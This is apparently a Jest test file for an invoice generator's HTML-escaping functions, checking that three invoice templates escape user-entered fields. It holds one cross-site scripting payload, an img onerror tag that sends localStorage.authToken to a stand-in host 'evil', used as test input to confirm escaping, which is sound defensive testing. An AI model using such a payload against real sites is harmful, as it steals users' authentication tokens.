import { escapeHtml, escapeHtmlDeep } from './html-escape';
import { generateInvoiceHtml } from './generate-invoice-html';
import { generateJewelleryInvoiceHtml } from './generate-jewellery-html';
import { generateModernInvoiceHtml } from './generate-modern-html';

const PAYLOAD = '<img src=x onerror="fetch(\'//evil/?\'+localStorage.authToken)">';

const invoiceData = (): any => ({
  company: {
    name: PAYLOAD,
    address: PAYLOAD,
    gstin: '22AAAAA0000A1Z5',
    state: 'MP',
    stateCode: '23',
  },
  buyer: { name: PAYLOAD, address: PAYLOAD, state: 'MP', stateCode: '23' },
  metadata: { invoiceNo: 'INV/1/25-26', date: '2025-04-01' },
  items: [
    {
      slNo: 1,
      description: PAYLOAD,
      hsnSac: '7113',
      quantity: 1,
      grossWeight: 5,
      netWeight: 4.8,
      rate: 6000,
      makingCharges: 0,
      amount: 28800,
      huid: PAYLOAD,
    },
  ],
  taxes: {
    cgstRate: 1.5,
    sgstRate: 1.5,
    cgstAmount: 1.5,
    sgstAmount: 1.5,
    igstRate: 0,
    igstAmount: 0,
  },
  taxType: 'CGST_SGST',
  hsnSummary: [],
  roundOff: 0,
  totalAmount: 103,
  amountInWords: 'One Hundred Three Only',
  taxAmountInWords: 'Three Only',
  amtBalance: 0,
  declaration: PAYLOAD,
  terms: PAYLOAD,
  payments: [{ mode: 'CASH', amount: 103, paidAt: new Date('2025-04-01') }],
});

describe('escapeHtml', () => {
  it('escapes the five HTML-significant characters', () => {
    expect(escapeHtml(`<a href="x">'&'</a>`)).toBe(
      '&lt;a href=&quot;x&quot;&gt;&#039;&amp;&#039;&lt;/a&gt;',
    );
  });
});

describe('escapeHtmlDeep', () => {
  it('escapes nested strings and leaves numbers, nulls and Dates untouched', () => {
    const date = new Date('2025-04-01');
    const out = escapeHtmlDeep({ a: '<b>', n: 5, z: null, d: date, list: [{ s: '"' }] });
    expect(out).toEqual({ a: '&lt;b&gt;', n: 5, z: null, d: date, list: [{ s: '&quot;' }] });
    expect(out.d).toBe(date);
  });

  it('does not mutate its input', () => {
    const input = { a: '<b>' };
    escapeHtmlDeep(input);
    expect(input.a).toBe('<b>');
  });
});

describe.each([
  ['classic', generateInvoiceHtml],
  ['jewellery', generateJewelleryInvoiceHtml],
  ['modern', generateModernInvoiceHtml],
])('%s invoice template', (_name, render) => {
  it('never emits user-entered markup unescaped', () => {
    const html = render(invoiceData());
    expect(html).not.toContain('<img src=x');
    expect(html).toContain('&lt;img src=x onerror=');
  });
});
